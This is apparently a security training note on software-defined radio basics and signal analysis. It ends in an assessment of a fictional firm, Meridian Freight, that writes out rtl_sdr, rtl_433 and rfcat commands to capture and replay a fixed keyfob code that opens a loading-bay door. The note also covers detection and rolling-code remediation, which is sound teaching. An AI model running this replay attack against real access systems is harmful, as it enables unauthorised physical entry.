---
title: SDR Fundamentals & Signal Analysis
aliases:
  - SDR
  - Software Defined Radio
  - RTL-SDR
tags:
  - tree/hardware
  - cyber/content
  - difficulty/practitioner
Domain:
  - "[[Radio & Wireless Protocols]]"
Color: "#9A6324"
verified: 2026-09-05
---

# SDR Fundamentals & Signal Analysis

> [!abstract] One sentence
> A software-defined radio replaces purpose-built hardware with a general-purpose receiver and a laptop — giving a single device the ability to receive, record, decode, and in some configurations transmit, almost any radio signal within its frequency range.

**Before you read:** Meridian Freight uses 433 MHz keyfobs to control the loading-bay doors. You can buy an RTL-SDR dongle for £15. What does your attack plan look like before you've opened any specialist tooling? Hold your answer.

## Parent Learning Order
[[Radio & Wireless Protocols]] → **SDR Fundamentals & Signal Analysis** → [[Zigbee & Z-Wave Security]]

---

## What an SDR Is

A traditional radio receiver is built for one frequency band and one modulation scheme. An SDR is a wideband ADC (analogue-to-digital converter) that samples a broad slice of the radio spectrum and delegates all signal processing to software. The result is a single piece of hardware that can behave as an FM receiver, an ADS-B decoder, a Bluetooth sniffer, or a 433 MHz keyfob recorder — by loading different software.

```
RF antenna → front-end amplifier/filter → ADC (samples at 2–3 MSPS)
          → USB → host CPU → GNU Radio / gqrx / custom Python (DSP in software)
```

### Common SDR Hardware

| Device | Frequency range | TX capable | Cost | Use case |
|---|---|---|---|---|
| RTL-SDR (RTL2832U) | 25 MHz – 1.75 GHz | No | £15–30 | Receive only; best entry point |
| HackRF One | 1 MHz – 6 GHz | Yes | £200–350 | Research; signal injection |
| YARD Stick One | Sub-GHz (300–928 MHz) | Yes | £80–120 | Sub-GHz protocol attacks |
| USRP B200 | 70 MHz – 6 GHz | Yes | £700–1000 | High-performance lab work |
| LimeSDR | 100 kHz – 3.8 GHz | Yes | £200–300 | Research; open hardware |

For a security assessment focused on IoT/keyfob/building access, an **RTL-SDR + YARD Stick One** pair covers receive and replay within the sub-GHz band.

---

## Setup and First Signals

```bash
# Install RTL-SDR drivers and GNU Radio
apt install rtl-sdr gnuradio gqrx-sdr sox

# Verify device recognised
rtl_test -t
# Found 1 device(s):
#   0:  Realtek, RTL2832U, SN: 77771111153705700
# Supported gain values (29): 0.0 4.0 8.0 ... 49.6

# Receive and record a 5-second IQ sample around 433.92 MHz (common keyfob frequency)
rtl_sdr -f 433920000 -s 2000000 -g 40 -n 10000000 keyfob-capture.cu8

# Listen to FM radio to verify antenna and reception work
rtl_fm -f 98.5e6 -M fm -s 200000 -r 48000 | aplay -r 48k -f S16_LE -t raw -c 1
```

### gqrx — Visual Spectrum Analysis

```
Launch: gqrx
Configure → Device: RTL-SDR, Frequency: 433.92 MHz, Sample rate: 2 MHz
View: FFT spectrum + waterfall display

What to look for:
  • Keyfob press → short burst appears in waterfall (OOK modulation, narrow bandwidth)
  • Z-Wave → 908.4 MHz (US) / 868.4 MHz (EU) — spread-spectrum bursts
  • Zigbee → 2.4 GHz (outside RTL-SDR range — use HackRF or dedicated Zigbee sniffer)
  • TPMS (tyre pressure) → 315/433 MHz — constant broadcasts from nearby vehicles
```

---

## Demodulation and Protocol Analysis

Once you have a recording, demodulate and decode it.

### OOK/ASK — On/Off Keying (Keyfobs, Garage Doors, Remote Controls)

```bash
# Decode OOK from IQ recording using rtl_433 (auto-detects many protocols)
rtl_433 -r keyfob-capture.cu8 -f 433920000 -s 2000000
# time      : 2026-09-05 11:30:15
# model     : Generic-Remote
# code      : 0xA4F3C7  (24-bit rolling code? or fixed code?)
# frequency : 433.9 MHz

# For unknown protocols — inspect in Universal Radio Hacker (URH)
urh keyfob-capture.cu8
# URH demodulates, shows bit sequence, and attempts protocol analysis
```

### Reading Raw Bits in Python

```python
import numpy as np

# Load RTL-SDR IQ recording (interleaved uint8 I/Q, offset binary)
raw = np.fromfile("keyfob-capture.cu8", dtype=np.uint8)
iq  = (raw.astype(np.float32) - 127.5) / 127.5
samples = iq[0::2] + 1j * iq[1::2]

# Compute power envelope (magnitude)
power = np.abs(samples)

# Threshold to find on/off transitions (OOK)
threshold = power.mean() + power.std()
bits = (power > threshold).astype(int)

# Find transitions
transitions = np.where(np.diff(bits))[0]
pulse_widths = np.diff(transitions)
print(pulse_widths[:20])
# [ 8  8 24  8 24 24  8  8 ...] ← short=0, long=1 (Manchester or PWM encoding)
```

> [!tip] The analogy, and where it breaks
> GNU Radio is to radio signals what Wireshark is to network packets — a live display and decode pipeline for the raw medium.
>
> **The deliberate break:** Wireshark knows your protocol. For unknown radio protocols, GNU Radio shows you the signal but not the meaning. Reverse engineering the protocol (bit order, framing, checksum, rolling code algorithm) requires a separate effort — Universal Radio Hacker automates much of it, but novel protocols still need manual work.

---

## Meridian Freight — 433 MHz Loading Bay Assessment

```bash
# Step 1: Record keyfob presses from a legitimate employee (or from parking lot range)
rtl_sdr -f 433920000 -s 2000000 -g 45 -n 20000000 meridian-bay-capture.cu8

# Step 2: Decode with rtl_433
rtl_433 -r meridian-bay-capture.cu8 -f 433920000 -s 2000000
# Decodes to a fixed 24-bit code: 0x8F2A1C
# Fixed code (no rolling) → trivial replay attack possible

# Step 3: Replay with YARD Stick One (if fixed code confirmed)
pip install rfcat
rfcat -r  # opens interactive Python shell
d.setFreq(433920000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(4800)           # data rate from pulse-width measurement
d.RFxmit(b'\x8F\x2A\x1C' * 3)  # transmit captured code 3 times
# → door opens
```

**How you'd spot it:** RF intrusion detection (RFIDS) monitors the 433 MHz band for unusual transmission patterns — multiple identical captures or unusually timed transmissions. Meridian should replace fixed-code keyfobs with rolling-code (KeeLoq) or modern challenge-response systems.

---

## Security Implications

- **Physical access via radio:** access control systems relying on fixed-code RF remotes are trivially defeated with a £15 receiver and a £90 transmitter — no credential theft, no network access required.
- **Passive eavesdropping:** OOK protocols in the clear (no encryption) leak operational patterns — when doors open, how many times per day, by how many distinct fobs — even if the code is rolling.
- **Scope of SDR threat:** the same hardware and workflow applies to TPMS, smart meters, paging systems, and some remote telemetry systems used in industrial environments — each a potential information disclosure or spoofing target.

---

## Summary

- An RTL-SDR dongle receives any signal from 25 MHz to 1.75 GHz; gqrx and rtl_433 decode dozens of common OOK/FSK protocols automatically; unknown protocols are analysed with Universal Radio Hacker.
- OOK-modulated fixed-code keyfobs (common on loading bays, parking barriers, and residential garage doors) are fully captured and replayed with rtl_sdr + rfcat/YARD Stick One — no cryptographic barrier.
- A complete sub-GHz assessment requires receive (RTL-SDR), analysis (URH/GNU Radio), and transmit (YARD Stick One or HackRF) capability; the RTL-SDR alone is sufficient for passive reconnaissance and protocol identification.

---
> 🔼 Up: [[Radio & Wireless Protocols]]
